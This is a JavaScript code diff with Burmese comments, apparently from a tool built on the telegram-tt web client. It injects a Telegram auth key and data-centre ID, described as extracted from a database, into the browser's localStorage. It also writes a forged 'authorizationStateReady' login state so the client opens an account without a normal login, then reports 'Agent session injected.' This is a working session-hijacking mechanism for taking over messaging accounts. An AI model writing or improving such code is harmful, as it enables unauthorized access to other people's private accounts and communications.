@@ -74,20 +74,29 @@ async function checkAndInjectSession() {
         
         const authKeyArray = hexToArray(data.authKeyHex);
         
-        // 🌟 [အရေးကြီးဆုံးအဆင့်] - ယခင်ကျန်နေသော QR Code/Logged-out State များကို ရှင်းလင်းခြင်း 🌟
-        localStorage.clear();
-        sessionStorage.clear();
-        
-        // telegram-tt ၏ Local Storage သို့ Session အသစ် သွင်းခြင်း
-        localStorage.setItem('dc', String(data.dcId));
-        localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
-        
-        alert("Mission Synchronized! Agent session injected.");
-        
-        // URL ထဲမှ Parameter ကို ဖျောက်ပြီး Reload လုပ်ကာ App ကို စတင်စေခြင်း
-        window.history.replaceState({}, document.title, window.location.pathname);
-        window.location.reload(); 
-        return; 
+        // 🌟 ယခင်ကျန်နေသော State များကို ရှင်းလင်းခြင်း
+localStorage.clear();
+sessionStorage.clear();
+
+// telegram-tt ၏ Local Storage သို့ Session နှင့် Auth Key အသစ် သွင်းခြင်း
+localStorage.setItem('dc', String(data.dcId));
+localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
+
+// 🌟 [အရေးကြီးဆုံး ထပ်တိုး] - App ကို Login ဝင်ပြီးကြောင်း သိစေရန် State သတ်မှတ်ခြင်း 🌟
+const globalState = {
+  auth: {
+    state: "authorizationStateReady"
+  }
+};
+localStorage.setItem('tt-global-state', JSON.stringify(globalState));
+// 🌟 အထက်ပါ ၅ ကြောင်းကို မဖြစ်မနေ ထည့်ပေးပါ 🌟
+
+alert("Mission Synchronized! Agent session injected.");
+
+// URL ထဲမှ Parameter ကို ဖျောက်ပြီး Reload လုပ်ကာ App ကို စတင်စေခြင်း
+window.history.replaceState({}, document.title, window.location.pathname);
+window.location.reload(); 
+return;
       } else {
         alert("Session extraction failed or not found in database.");
       }
